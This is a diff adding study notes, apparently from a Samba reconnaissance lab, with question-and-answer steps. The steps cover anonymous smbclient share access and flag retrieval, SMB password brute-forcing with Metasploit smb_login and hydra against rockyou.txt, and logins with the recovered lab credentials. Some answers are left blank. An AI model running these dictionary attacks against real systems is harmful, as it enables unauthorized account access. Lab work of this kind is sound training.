@@ -217,13 +217,48 @@ enum4linux -i [ip]
 
 9.  How many directories are present inside share “public”?
 ```
+smbclient //[ip]/Public -N
 
+smb - help
+ls
+cd secret 
+ls
+get flag
+exit
+cat flag
+```
+---
+# Samba Recon: Dictionary Attack
+1.  What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
+```
+msfconsole - use auxiliary/scanner/smb/smb_login
 ```
 
-10.  Fetch the flag from samba server.
+3.  What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
+```
+hydra -l admin -P /path file/ [ip] smb<-(protocol)
 ```
 
+4.  Which share is read only? Use smbmap with credentials obtained in question 2.
 ```
+smbmap -H [ip] -u admin -p password1
+```
+
+5.  Is share “jane” browseable? Use credentials obtained from the 1st question.
+```
+smbclient -L [ip] -U jane 
+password: abc123
+```
+
+6.  Fetch the flag from share “admin”
+
+
+7.  List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
+
+
+8.  List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
+
+
 
 
 ---
